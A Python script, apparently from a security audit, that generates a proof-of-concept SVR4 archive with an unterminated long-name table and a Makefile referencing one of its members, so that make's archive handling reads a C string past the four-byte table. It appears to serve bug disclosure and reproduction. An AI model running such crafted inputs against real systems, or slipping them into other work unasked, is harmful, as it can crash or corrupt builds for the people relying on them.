#!/usr/bin/env python3
"""Generate a PoC SVR4 archive for finding 003."""
from pathlib import Path
import sys


def ar_header(name: bytes, size: int) -> bytes:
    if len(name) > 16:
        raise ValueError("ar_name must fit in 16 bytes")
    return b"".join([
        name.ljust(16),
        b"0".ljust(12),
        b"0".ljust(6),
        b"0".ljust(6),
        b"100644".ljust(8),
        str(size).encode("ascii").ljust(10),
        b"`\n",
    ])


def main() -> None:
    outdir = Path(sys.argv[1]) if len(sys.argv) > 1 else Path(__file__).resolve().parent
    outdir.mkdir(parents=True, exist_ok=True)
    archive = outdir / "003-unterminated-svr4.a"
    makefile = outdir / "003-unterminated-svr4-long-name.mk"

    # SVR4 name table has no '/' and no NUL, so /0 returns a non-terminated C string.
    data = b"!<arch>\n"
    data += ar_header(b"//", 4) + b"ABCD"
    data += ar_header(b"/0", 0)
    archive.write_bytes(data)
    makefile.write_text(
        "# Generated by 003-unterminated-svr4-long-name.py\n"
        "# Hashing this SVR4 archive treats ABCD as a C string past the 4-byte table.\n"
        f"all: {archive.as_posix()}(member)\n",
        encoding="ascii",
    )
    print(f"wrote {archive}")
    print(f"wrote {makefile}")
    print(f"run: make -f {makefile} all")


if __name__ == "__main__":
    main()
